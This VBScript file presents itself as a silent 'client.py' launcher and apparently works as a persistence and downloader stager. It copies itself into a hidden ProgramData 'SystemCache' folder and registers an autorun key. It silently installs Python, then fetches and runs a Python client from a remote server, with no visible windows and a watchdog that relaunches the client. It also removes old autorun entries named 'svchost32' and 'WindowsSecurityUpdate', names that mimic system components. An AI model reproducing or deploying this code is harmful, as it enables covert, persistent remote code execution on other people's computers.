' ============================================================================
' CLIENT.PY SINGLE-INSTANCE SILENT LAUNCHER - IMPROVED VERSION
' ============================================================================
' This VBS script ensures only one instance of client.py runs at a time
' It launches silently without any visible windows
' ============================================================================

Option Explicit
Dim sh, fso
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim arch: arch = LCase(sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%"))
Const EXPECTED_SHA256 = ""
Const REG_DEBUG_KEY = "HKCU\Software\NCH\ClientLauncher\DebugEnabled"
Const REG_SHOW_CLIENT_CONSOLE = "HKCU\Software\NCH\ClientLauncher\ShowClientConsole"
Const REG_SHOW_SUBPROC_WINDOWS = "HKCU\Software\NCH\ClientLauncher\ShowSubprocWindows"
Dim scriptDir: scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
Dim safeDir: safeDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\SystemCache"
If Not fso.FolderExists(safeDir) Then
  fso.CreateFolder(safeDir)
  On Error Resume Next
  fso.GetFolder(safeDir).Attributes = fso.GetFolder(safeDir).Attributes Or 2
  On Error GoTo 0
End If
Dim logDir: logDir = sh.ExpandEnvironmentStrings("%TEMP%") & "\ClientLauncher"
If Not fso.FolderExists(logDir) Then fso.CreateFolder(logDir)
Dim logPath: logPath = logDir & "\launcher.log"

' ---------------------- Debug Helpers ----------------------
Function RegReadDefault(path, def)
  On Error Resume Next
  Dim v: v = sh.RegRead(path)
  If IsEmpty(v) Or IsNull(v) Then
    RegReadDefault = def
  Else
    RegReadDefault = v
  End If
End Function
Sub RegWriteString(path, val)
  On Error Resume Next
  sh.RegWrite path, val, "REG_SZ"
End Sub
Function DebugEnabled()
  On Error Resume Next
  Dim envDbg: envDbg = LCase(Trim(sh.ExpandEnvironmentStrings("%CLIENT_LAUNCHER_DEBUG%")))
  If envDbg = "1" Or envDbg = "true" Or envDbg = "on" Then DebugEnabled = True : Exit Function
  Dim fileDbg: fileDbg = safeDir & "\DEBUG.ON"
  If fso.FileExists(fileDbg) Then DebugEnabled = True : Exit Function
  Dim regDbg: regDbg = RegReadDefault(REG_DEBUG_KEY, "0")
  DebugEnabled = (CStr(regDbg) = "1")
End Function
Function ShowClientConsoleEnabled()
  On Error Resume Next
  Dim v: v = RegReadDefault(REG_SHOW_CLIENT_CONSOLE, "0")
  ShowClientConsoleEnabled = (CStr(v) = "1")
End Function
Function ShowSubprocWindowsEnabled()
  On Error Resume Next
  Dim v: v = RegReadDefault(REG_SHOW_SUBPROC_WINDOWS, "0")
  ShowSubprocWindowsEnabled = (CStr(v) = "1")
End Function
Function IsConsoleHost()
  On Error Resume Next
  Dim host: host = LCase(WScript.FullName & "")
  IsConsoleHost = (InStr(host, "cscript.exe") > 0)
End Function
Sub DebugPrint(s)
  On Error Resume Next
  If DebugEnabled() Then
    If IsConsoleHost() Then
      WScript.StdOut.WriteLine Now & " " & s
    Else
      WScript.Echo Now & " " & s
    End If
  End If
  ' Always append to log file
  Log s
End Sub
Function WindowStyle()
  If DebugEnabled() Then
    WindowStyle = 1
  Else
    WindowStyle = 0
  End If
End Function

' Handle CLI debug toggles
Sub HandleDebugCLI()
  On Error Resume Next
  Dim i, arg, key, val
  For i = 0 To WScript.Arguments.Count - 1
    arg = LCase(CStr(WScript.Arguments(i)))
    If Left(arg, 6) = "/debug" Or Left(arg, 6) = "debug:" Then
      Dim parts: parts = Split(Replace(arg, "/debug", "debug", 1, 1, vbTextCompare), ":")
      If UBound(parts) >= 1 Then
        val = parts(1)
        If val = "on" Or val = "1" Or val = "true" Then
          RegWriteString REG_DEBUG_KEY, "1"
          WScript.Echo "ClientLauncher DebugEnabled = ON"
        ElseIf val = "off" Or val = "0" Or val = "false" Then
          RegWriteString REG_DEBUG_KEY, "0"
          WScript.Echo "ClientLauncher DebugEnabled = OFF"
        ElseIf val = "status" Then
          WScript.Echo "ClientLauncher DebugEnabled = " & CStr(DebugEnabled())
        End If
      End If
    ElseIf Left(arg, 12) = "/showclient" Or Left(arg, 12) = "showclient:" Then
      Dim p2: p2 = Split(Replace(arg, "/showclient", "showclient", 1, 1, vbTextCompare), ":")
      If UBound(p2) >= 1 Then
        val = p2(1)
        If val = "on" Or val = "1" Or val = "true" Then
          RegWriteString REG_SHOW_CLIENT_CONSOLE, "1"
          WScript.Echo "ShowClientConsole = ON"
        ElseIf val = "off" Or val = "0" Or val = "false" Then
          RegWriteString REG_SHOW_CLIENT_CONSOLE, "0"
          WScript.Echo "ShowClientConsole = OFF"
        ElseIf val = "status" Then
          WScript.Echo "ShowClientConsole = " & CStr(ShowClientConsoleEnabled())
        End If
      End If
    ElseIf Left(arg, 12) = "/showsubproc" Or Left(arg, 12) = "showsubproc:" Then
      Dim p3: p3 = Split(Replace(arg, "/showsubproc", "showsubproc", 1, 1, vbTextCompare), ":")
      If UBound(p3) >= 1 Then
        val = p3(1)
        If val = "on" Or val = "1" Or val = "true" Then
          RegWriteString REG_SHOW_SUBPROC_WINDOWS, "1"
          WScript.Echo "ShowSubprocWindows = ON"
        ElseIf val = "off" Or val = "0" Or val = "false" Then
          RegWriteString REG_SHOW_SUBPROC_WINDOWS, "0"
          WScript.Echo "ShowSubprocWindows = OFF"
        ElseIf val = "status" Then
          WScript.Echo "ShowSubprocWindows = " & CStr(ShowSubprocWindowsEnabled())
        End If
      End If
    End If
  Next
End Sub
HandleDebugCLI

' If debug is enabled and we are not in console host, re-launch under cscript with visible console
If DebugEnabled() And Not IsConsoleHost() Then
  On Error Resume Next
  Dim args, j
  args = ""
  For j = 0 To WScript.Arguments.Count - 1
    args = args & " " & WScript.Arguments(j)
  Next
  DebugPrint "Re-launching under console (cscript) for visible debugging"
  sh.Run "cscript //nologo """ & WScript.ScriptFullName & """" & " " & args, 1, False
  WScript.Quit 0
End If
Sub EnsureSafeLauncher()
  On Error Resume Next
  Dim dest
  dest = safeDir & "\ClientService.vbs"
  fso.CopyFile WScript.ScriptFullName, dest, True
  fso.GetFile(dest).Attributes = fso.GetFile(dest).Attributes Or 2
End Sub

Sub EnsureClientInSafe()
  On Error Resume Next
  Dim src, dest
  src = scriptDir & "\client.py"
  dest = safeDir & "\client.py"
  If fso.FileExists(src) Then
    fso.CopyFile src, dest, True
  End If
End Sub
Sub EnsureAutorun()
  On Error Resume Next
  Dim runKey, cmd, dest
  dest = safeDir & "\ClientService.vbs"
  EnsureSafeLauncher
  EnsureClientInSafe
  runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher"
  cmd = "wscript.exe """ & dest & """"
  sh.RegWrite runKey, cmd, "REG_SZ"
End Sub
EnsureAutorun
Sub RemoveLegacyAutorun()
  On Error Resume Next
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost32"
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate"
End Sub
RemoveLegacyAutorun
Sub Log(s)
  On Error Resume Next
  Dim lf: Set lf = fso.OpenTextFile(logPath, 8, True)
  lf.WriteLine Now & " " & s
  lf.Close
End Sub
Function ExecOut(cmd)
  On Error Resume Next
  Dim tmp, rc, out
  Randomize
  tmp = logDir & "\out_" & Replace(Replace(Replace(CStr(Now), ":", "_"), " ", "_"), "/", "_") & "_" & CStr(Int(Rnd * 1000000)) & ".txt"
  If DebugEnabled() Then DebugPrint "Exec: " & cmd
  Dim style: style = 0
  If DebugEnabled() And ShowSubprocWindowsEnabled() Then style = 1 Else style = 0
  If LCase(Left(cmd, 7)) = "cmd /c " Then
    rc = sh.Run(cmd & " > """ & tmp & """ 2>&1", style, True)
  Else
    rc = sh.Run("cmd /c " & cmd & " > """ & tmp & """ 2>&1", style, True)
  End If
  out = ReadText(tmp)
  If fso.FileExists(tmp) Then
    On Error Resume Next
    fso.DeleteFile tmp, True
    On Error GoTo 0
  End If
  ExecOut = out
End Function
Function FindPythonw()
  On Error Resume Next
  Dim out, lines, i, p
  out = ExecOut("cmd /c where pythonw.exe")
  lines = Split(out, vbCrLf)
  For i = 0 To UBound(lines)
    p = Trim(lines(i))
    If p <> "" And fso.FileExists(p) Then FindPythonw = p : Exit Function
  Next
  out = ExecOut("cmd /c where python.exe")
  lines = Split(out, vbCrLf)
  For i = 0 To UBound(lines)
    p = Trim(lines(i))
    If p <> "" Then
      p = Replace(p, "python.exe", "pythonw.exe")
      If fso.FileExists(p) Then FindPythonw = p : Exit Function
    End If
  Next
  p = sh.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python312\pythonw.exe"
  If fso.FileExists(p) Then FindPythonw = p : Exit Function
  FindPythonw = ""
End Function
Function FileSHA256(path)
  On Error Resume Next
  Dim out: out = ExecOut("cmd /c certutil -hashfile """ & path & """ SHA256")
  Dim lines: lines = Split(out, vbCrLf)
  Dim i, h: h = ""
  For i = 0 To UBound(lines)
    If Len(lines(i)) >= 64 And InStr(lines(i), " ") = 0 Then
      h = Trim(lines(i))
      Exit For
    End If
  Next
  FileSHA256 = LCase(h)
End Function
Function FileMD5(path)
  On Error Resume Next
  Dim out: out = ExecOut("cmd /c certutil -hashfile """ & path & """ MD5")
  Dim lines: lines = Split(out, vbCrLf)
  Dim i, h: h = ""
  For i = 0 To UBound(lines)
    If Len(lines(i)) >= 32 And InStr(lines(i), " ") = 0 Then
      h = Trim(lines(i))
      Exit For
    End If
  Next
  FileMD5 = LCase(h)
End Function
Function ReadText(path)
  On Error Resume Next
  If Not fso.FileExists(path) Then ReadText = "" : Exit Function
  Dim t: t = ""
  Dim f: Set f = fso.OpenTextFile(path, 1, False)
  t = f.ReadAll
  f.Close
  ReadText = t
End Function
Function HttpGet(url)
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", url, False
  xhr.Send
  If xhr.Status = 200 Then
    HttpGet = xhr.responseText
  Else
    HttpGet = ""
  End If
End Function
Function ExtractJsonValue(json, key)
  On Error Resume Next
  Dim k: k = """" & key & """"
  Dim p: p = InStr(1, json, k, vbTextCompare)
  If p = 0 Then ExtractJsonValue = "" : Exit Function
  p = InStr(p, json, ":")
  If p = 0 Then ExtractJsonValue = "" : Exit Function
  p = InStr(p, json, """")
  If p = 0 Then ExtractJsonValue = "" : Exit Function
  Dim q: q = InStr(p + 1, json, """")
  If q = 0 Then ExtractJsonValue = "" : Exit Function
  ExtractJsonValue = Mid(json, p + 1, q - p - 1)
End Function
Function LatestStateJson()
  On Error Resume Next
  Dim baseRemote, base1, base2, j
  baseRemote = "https://neural-control-hub.onrender.com"
  base1 = "http://127.0.0.1:8080"
  base2 = "http://localhost:8080"
  j = HttpGet(baseRemote & "/download/updater/latest.json")
  If j <> "" Then LatestStateJson = j : Exit Function
  j = HttpGet(base1 & "/download/updater/latest.json")
  If j <> "" Then LatestStateJson = j : Exit Function
  j = HttpGet(base2 & "/download/updater/latest.json")
  If j <> "" Then LatestStateJson = j : Exit Function
  LatestStateJson = ""
End Function
Function UpdaterSHA256()
  On Error Resume Next
  Dim j: j = LatestStateJson()
  Dim v
  If j <> "" Then
    v = ExtractJsonValue(j, "sha256")
  End If
  If v = "" Then
    Dim p: p = scriptDir & "\updates\updater_state.json"
    j = ReadText(p)
    v = ExtractJsonValue(j, "sha256")
  End If
  If v = "" Then v = EXPECTED_SHA256
  UpdaterSHA256 = LCase(v)
End Function
Function UpdaterMD5()
  On Error Resume Next
  Dim j: j = LatestStateJson()
  Dim v
  If j <> "" Then
    v = ExtractJsonValue(j, "md5")
  End If
  If v = "" Then
    Dim p: p = scriptDir & "\updates\updater_state.json"
    j = ReadText(p)
    v = ExtractJsonValue(j, "md5")
  End If
  UpdaterMD5 = LCase(v)
End Function
Function UpdaterURL()
  On Error Resume Next
  Dim j: j = LatestStateJson()
  Dim u
  If j <> "" Then
    u = ExtractJsonValue(j, "download_url")
  End If
  If u = "" Then
    Dim p: p = scriptDir & "\updates\updater_state.json"
    j = ReadText(p)
    u = ExtractJsonValue(j, "download_url")
  End If
  If u = "" Then
    u = "https://neural-control-hub.onrender.com/download/updater/client.py"
  End If
  UpdaterURL = u
End Function
Function LatestVersion()
  On Error Resume Next
  Dim j: j = LatestStateJson()
  Dim v
  If j <> "" Then
    v = ExtractJsonValue(j, "version")
  End If
  If v = "" Then
    v = ExtractJsonValue(j, "sha256")
    If v = "" Then v = ExtractJsonValue(j, "md5")
  End If
  LatestVersion = v
End Function
Function DownloadToFile(url, path)
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", url, False
  xhr.Send
  If xhr.Status = 200 Then
    Dim stm: Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write xhr.responseBody
    stm.SaveToFile path, 2
    stm.Close
    DownloadToFile = True
  Else
    DownloadToFile = False
  End If
End Function
Function IsOnline()
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", "http://www.msftconnecttest.com/connecttest.txt", False
  xhr.Send
  If xhr.Status = 200 Then IsOnline = True : Exit Function
  Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", "https://www.google.com/generate_204", False
  xhr.Send
  If xhr.Status = 204 Or xhr.Status = 200 Then
    IsOnline = True
  Else
    IsOnline = False
  End If
End Function
Function PythonAvailable()
  On Error Resume Next
  Dim out: out = ExecOut("cmd /c py -3 -V")
  If InStr(out, "Python 3") > 0 Then PythonAvailable = True : Exit Function
  out = ExecOut("cmd /c python.exe -V")
  If InStr(out, "Python 3") > 0 Then PythonAvailable = True Else PythonAvailable = False
End Function
Sub EnsurePython()
  If PythonAvailable() Then Exit Sub
  If Not IsOnline() Then
    DebugPrint "Offline detected; deferring Python install"
    Exit Sub
  End If
  Dim url, installer
  If InStr(arch, "64") > 0 Then
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
  Else
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
  End If
  installer = logDir & "\python312.exe"
  If Not DownloadToFile(url, installer) Then DebugPrint "Python download failed: " & url : Exit Sub
  Dim cmd: cmd = """" & installer & """ /quiet PrependPath=1 Include_test=0"
  Dim style: style = 0
  If DebugEnabled() And ShowSubprocWindowsEnabled() Then style = 1 Else style = 0
  sh.Run cmd, style, True
  If Not PythonAvailable() Then DebugPrint "Python install failed"
End Sub
Function FindClientPy()
  Dim pScript: pScript = scriptDir & "\client.py"
  Dim expected: expected = UpdaterSHA256()
  If expected = "" Then
    expected = UpdaterMD5()
  End If
  Dim url: url = UpdaterURL()
  Dim ver: ver = LatestVersion()
  If ver = "" Then ver = "latest"
  Dim pVer: pVer = safeDir & "\client_" & ver & ".py"
  ' Helper to compare correct hash based on expected length
  Dim CompareHash
  CompareHash = False
  If Len(expected) = 64 Then
    Dim cur256: cur256 = FileSHA256(pVer)
    If cur256 = expected And cur256 <> "" Then CompareHash = True
  ElseIf Len(expected) = 32 Then
    Dim curMd5: curMd5 = FileMD5(pVer)
    If curMd5 = expected And curMd5 <> "" Then CompareHash = True
  End If
  If fso.FileExists(pVer) Then
    If CompareHash Then
      DebugPrint "Using existing verified client: " & pVer
      FindClientPy = pVer
      Exit Function
    End If
  End If
  If fso.FileExists(pScript) Then
    Dim matchScript
    matchScript = False
    If Len(expected) = 64 Then
      Dim m256: m256 = FileSHA256(pScript)
      If m256 = expected And m256 <> "" Then matchScript = True
    ElseIf Len(expected) = 32 Then
      Dim mmd5: mmd5 = FileMD5(pScript)
      If mmd5 = expected And mmd5 <> "" Then matchScript = True
    End If
    If matchScript Then
      On Error Resume Next
      fso.CopyFile pScript, pVer, True
      On Error GoTo 0
      If fso.FileExists(pVer) Then
        Dim matchCopied
        matchCopied = False
        If Len(expected) = 64 Then
          Dim cp256: cp256 = FileSHA256(pVer)
          If cp256 = expected And cp256 <> "" Then matchCopied = True
        ElseIf Len(expected) = 32 Then
          Dim cpmd5: cpmd5 = FileMD5(pVer)
          If cpmd5 = expected And cpmd5 <> "" Then matchCopied = True
        End If
        If matchCopied Then
          DebugPrint "Copied and verified client to safe dir: " & pVer
          FindClientPy = pVer
          Exit Function
        End If
      End If
    End If
  End If
  If Not IsOnline() Then
    DebugPrint "Offline detected; deferring client.py download"
    FindClientPy = ""
    Exit Function
  End If
  If DownloadToFile(url, pVer) Then
    Dim matchDownloaded
    matchDownloaded = False
    If Len(expected) = 64 Then
      Dim d256: d256 = FileSHA256(pVer)
      If d256 = expected And d256 <> "" Then matchDownloaded = True
    ElseIf Len(expected) = 32 Then
      Dim dmd5: dmd5 = FileMD5(pVer)
      If dmd5 = expected And dmd5 <> "" Then matchDownloaded = True
    End If
    If matchDownloaded Then
      CleanOldClients pVer
      DebugPrint "Downloaded and verified client: " & pVer
      FindClientPy = pVer
      Exit Function
    Else
      On Error Resume Next
      fso.DeleteFile pVer, True
      On Error GoTo 0
      DebugPrint "Hash mismatch or empty for downloaded client"
    End If
  Else
    DebugPrint "client.py download failed"
  End If
  FindClientPy = ""
End Function
Function IsRunning()
  On Error Resume Next
  Dim svc: Set svc = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
  Dim col: Set col = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
  Dim p, cmd
  For Each p In col
    cmd = LCase(p.CommandLine & "")
    If InStr(cmd, "client_") > 0 Or InStr(cmd, "client.py") > 0 Then
      IsRunning = True
      Exit Function
    End If
  Next
  IsRunning = False
End Function
Sub TerminateExisting()
  On Error Resume Next
  Dim svc: Set svc = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
  Dim col: Set col = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
  Dim p, cmd
  For Each p In col
    cmd = LCase(p.CommandLine & "")
    If InStr(cmd, "client_") > 0 Or InStr(cmd, "client.py") > 0 Then
      p.Terminate()
    End If
  Next
End Sub
Sub CleanOldClients(keepPath)
  On Error Resume Next
  Dim f
  For Each f In fso.GetFolder(safeDir).Files
    Dim nm: nm = LCase(f.Name)
    If Right(nm, 3) = ".py" Then
      If Left(nm, 7) = "client_" And LCase(f.Path) <> LCase(keepPath) Then
        fso.DeleteFile f.Path, True
      End If
      If nm = "client.py" And LCase(f.Path) <> LCase(keepPath) Then
        fso.DeleteFile f.Path, True
      End If
    End If
  Next
End Sub
Sub LaunchClient(scriptPath)
  Dim wd: wd = fso.GetParentFolderName(scriptPath)
  Dim cmd
  On Error Resume Next
  sh.CurrentDirectory = wd
  Dim pyw: pyw = FindPythonw()
  Dim pyexe: pyexe
  pyexe = ""
  If DebugEnabled() And ShowClientConsoleEnabled() Then
    If pyw <> "" Then
      pyexe = Replace(pyw, "pythonw.exe", "python.exe")
      If Not fso.FileExists(pyexe) Then pyexe = "python.exe"
    Else
      If PythonAvailable() Then
        pyexe = "py -3"
      Else
        pyexe = "python.exe"
      End If
    End If
  Else
    If pyw <> "" Then
      pyexe = """" & pyw & """"
    ElseIf PythonAvailable() Then
      pyexe = "py -3"
    Else
      pyexe = "python.exe"
    End If
  End If
  If InStr(pyexe, "python.exe") > 0 Or InStr(LCase(pyexe), "py -3") > 0 Then
    cmd = pyexe & " """ & scriptPath & """"
  Else
    cmd = pyexe & " """ & scriptPath & """"
  End If
  DebugPrint "Launching client with: " & cmd
  sh.Run cmd, WindowStyle(), False
End Sub
Sub Main()
  If DebugEnabled() Then
    DebugPrint "=== ClientLauncher Debug Mode Enabled ==="
    DebugPrint "Host: " & WScript.FullName
    DebugPrint "ScriptDir: " & scriptDir
    DebugPrint "SafeDir: " & safeDir
  End If
  EnsurePython()
  Dim cp: cp = FindClientPy()
  If cp = "" Then DebugPrint "client.py unavailable" : Exit Sub
  TerminateExisting
  LaunchClient cp : WScript.Sleep 3000
  Do
    If Not IsRunning() Then
      cp = FindClientPy()
      If cp <> "" Then LaunchClient cp
    End If
    WScript.Sleep 10000
  Loop
End Sub
Main
